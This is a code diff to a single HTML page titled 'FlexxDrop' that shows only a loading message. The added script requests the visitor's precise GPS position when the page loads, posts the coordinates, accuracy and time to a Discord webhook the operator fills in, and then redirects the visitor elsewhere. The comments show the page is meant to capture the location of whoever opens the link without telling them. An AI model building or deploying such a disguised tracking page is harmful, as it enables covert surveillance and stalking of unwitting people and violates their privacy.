@@ -1,51 +1,82 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>FlexxDrop</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <style>
-      html, body {
-        background-color: #000;
-        color: #fff;
-        margin: 0;
-        height: 100%;
-        font-family: Arial, sans-serif;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 1.2rem;
-      }
-    </style>
-  </head>
-  <body>
-    <div>Loading FlexxDrop…</div>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>FlexxDrop</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: #000;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 1.2rem;
+    }
+  </style>
+</head>
+<body>
+  <div>Loading FlexxDrop…</div>
 
-    <script>
-      window.onload = () => {
-        if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              console.log("Latitude:", position.coords.latitude);
-              console.log("Longitude:", position.coords.longitude);
-              console.log("Accuracy:", position.coords.accuracy + " meters");
-              // TODO: Add webhook here if needed
-              // TODO: Add redirect here if needed
-            },
-            (error) => {
-              console.error("Location error:", error.message);
-              // Optionally redirect or close
-              // window.location.href = "about:blank";
-            },
-            {
-              enableHighAccuracy: true,
-              timeout: 10000,
-              maximumAge: 0
-            }
-          );
-        } else {
-          console.warn("Geolocation not supported.");
-        }
+  <script>
+    // 🔁 Replace this with your actual Discord webhook
+    const webhookUrl = "https://discord.com/api/webhooks/PUT_YOUR_WEBHOOK_HERE";
+
+    // 🔁 Replace this with where you want the person to be redirected after GPS is captured
+    const redirectUrl = "https://example.com"; // Optional: change this or leave it
+
+    function sendToDiscord(lat, lon, acc) {
+      const payload = {
+        content: `📍 **GPS Captured**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${acc}m\n🕒 ${new Date().toLocaleString()}`
       };
-    </script>
-  </body>
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      // Optional: redirect after 1 second
+      setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 1000);
+    }
+
+    function getGPS() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+
+            console.log("Lat:", lat);
+            console.log("Lon:", lon);
+            console.log("Accuracy:", acc);
+
+            sendToDiscord(lat, lon, acc);
+          },
+          (err) => {
+            console.error("GPS error:", err.message);
+            // Optional: close tab or redirect if denied
+            window.location.href = "about:blank";
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        console.warn("Geolocation not supported.");
+      }
+    }
+
+    window.onload = getGPS;
+  </script>
+</body>
 </html>
